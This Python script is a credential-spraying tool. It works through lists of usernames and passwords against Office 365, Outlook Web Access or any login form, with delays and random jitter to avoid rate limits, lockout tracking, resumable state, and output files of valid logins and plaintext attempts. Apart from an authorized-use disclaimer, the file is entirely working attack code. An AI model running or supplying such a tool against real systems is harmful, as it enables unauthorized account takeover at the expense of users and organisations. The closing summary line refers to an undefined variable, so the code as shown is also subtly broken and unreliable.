#!/usr/bin/env python3
"""
Credential spray orchestrator.

For authorized use on systems you own or have explicit written permission to test.
Unauthorized use against systems you do not own is illegal.
"""
import argparse
import json
import random
import sys
import time
from datetime import datetime
from pathlib import Path

import requests

from targets import o365, owa


def _now() -> str:
    return datetime.now().strftime("%H:%M:%S")


def _load_lines(path: str) -> list[str]:
    with open(path) as f:
        return [line.strip() for line in f if line.strip()]


def _load_state(state_file: Path) -> set[str]:
    try:
        data = json.loads(state_file.read_text())
        return set(data.get("attempted", []))
    except FileNotFoundError:
        return set()


def _save_state(state_file: Path, attempted: set[str]) -> None:
    state_file.write_text(json.dumps({"attempted": list(attempted)}))


def _log_attempt(log_file: Path, username: str, password: str, status: str, notes: str) -> None:
    entry = {
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "username": username,
        "password": password,
        "status": status,
        "notes": notes,
    }
    with log_file.open("a") as f:
        f.write(json.dumps(entry) + "\n")


def _write_valid(output_file: Path, username: str, password: str) -> None:
    with output_file.open("a") as f:
        f.write(f"{username}:{password}\n")


def _attempt_generic(username: str, password: str, url: str, success_code: int) -> dict:
    try:
        r = requests.post(
            url,
            data={"username": username, "password": password},
            allow_redirects=False,
            timeout=15,
        )
    except Exception as e:
        return {"success": False, "locked": False, "notes": f"request error: {e}"}

    if r.status_code == 429:
        return {"success": False, "locked": False, "notes": "rate_limited"}

    if r.status_code == success_code:
        return {"success": True, "locked": False, "notes": "valid"}

    return {"success": False, "locked": False, "notes": f"status={r.status_code}"}


def _build_pairs(userlist: list[str], passwords: list[str]) -> list[tuple[str, str]]:
    pairs = []
    for password in passwords:
        for username in userlist:
            pairs.append((username, password))
    return pairs


def main() -> None:
    parser = argparse.ArgumentParser(
        description=(
            "Credential spray orchestrator. "
            "For authorized use on systems you own or have explicit written permission to test."
        )
    )
    parser.add_argument("--userlist", required=True, help="Path to username list (one per line)")
    parser.add_argument("--password", help="Single password to spray")
    parser.add_argument("--passlist", help="Path to password list (one per line)")
    parser.add_argument(
        "--target",
        required=True,
        help="Target type: 'o365', 'owa', or a generic URL (https://...)",
    )
    parser.add_argument("--owa-url", help="Base OWA URL (required when --target owa)")
    parser.add_argument(
        "--output", default="valid_creds.txt", help="File to write valid credentials (default: valid_creds.txt)"
    )
    parser.add_argument(
        "--lockout-threshold",
        type=int,
        default=3,
        help="Skip account after this many lockout responses (default: 3)",
    )
    parser.add_argument(
        "--delay", type=float, default=1.5, help="Base delay in seconds between attempts (default: 1.5)"
    )
    parser.add_argument(
        "--jitter", type=float, default=1.0, help="Max random jitter added to delay in seconds (default: 1.0)"
    )
    parser.add_argument(
        "--success-code",
        type=int,
        default=302,
        help="HTTP status code indicating success for generic URL target (default: 302)",
    )
    parser.add_argument(
        "--resume",
        action="store_true",
        help="Resume from .spray_state.json, skipping already-attempted pairs",
    )
    args = parser.parse_args()

    if not args.password and not args.passlist:
        parser.error("One of --password or --passlist is required.")

    if args.target == "owa" and not args.owa_url:
        parser.error("--owa-url is required when --target is 'owa'.")

    userlist = _load_lines(args.userlist)
    passwords = [args.password] if args.password else _load_lines(args.passlist)

    output_file = Path(args.output)
    log_file = output_file.parent / ".spray_log.jsonl"
    state_file = output_file.parent / ".spray_state.json"

    attempted: set[str] = _load_state(state_file) if args.resume else set()

    pairs = _build_pairs(userlist, passwords)
    lockout_counts: dict[str, int] = {}

    valid_count = 0
    skipped = 0

    print(f"[{_now()}] Starting spray: {len(userlist)} users x {len(passwords)} passwords = {len(pairs)} pairs", file=sys.stderr)
    if args.resume and attempted:
        print(f"[{_now()}] Resuming: {len(attempted)} pairs already attempted", file=sys.stderr)

    for username, password in pairs:
        pair_key = f"{username}:{password}"

        if pair_key in attempted:
            skipped += 1
            continue

        if lockout_counts.get(username, 0) >= args.lockout_threshold:
            continue

        sleep_time = args.delay + random.uniform(0, args.jitter)
        time.sleep(sleep_time)

        if args.target == "o365":
            result = o365.attempt(username, password)
        elif args.target == "owa":
            result = owa.attempt(username, password, args.owa_url)
        else:
            result = _attempt_generic(username, password, args.target, args.success_code)

        if result["notes"] == "rate_limited":
            pause = args.delay * 5
            print(f"[{_now()}] WARNING: rate limited — pausing {pause:.1f}s", file=sys.stderr)
            time.sleep(pause)
            result = {"success": False, "locked": False, "notes": "rate_limited_skipped"}

        status = "VALID" if result["success"] else ("LOCKED" if result["locked"] else "INVALID")
        print(f"[{_now()}] {username}:{password} → {status} | {result['notes']}", file=sys.stderr)

        _log_attempt(log_file, username, password, status, result["notes"])
        attempted.add(pair_key)
        if len(attempted) % 50 == 0:
            _save_state(state_file, attempted)

        if result["success"]:
            valid_count += 1
            _write_valid(output_file, username, password)

        if result["locked"]:
            lockout_counts[username] = lockout_counts.get(username, 0) + 1
            if lockout_counts[username] >= args.lockout_threshold:
                print(f"[{_now()}] Skipping {username} — lockout threshold reached", file=sys.stderr)

        locked_out_count = sum(1 for c in lockout_counts.values() if c >= args.lockout_threshold)
        if locked_out_count == len(userlist):
            print(f"[{_now()}] All accounts hit lockout threshold. Exiting.", file=sys.stderr)
            break

    _save_state(state_file, attempted)

    print(
        f"[{_now()}] Done. Valid: {valid_count} | Locked out: {len(locked_out)} | Skipped (resume): {skipped}",
        file=sys.stderr,
    )
    print(f"[{_now()}] Valid creds written to: {output_file}", file=sys.stderr)
    print(f"[{_now()}] Full log written to: {log_file}", file=sys.stderr)


if __name__ == "__main__":
    main()
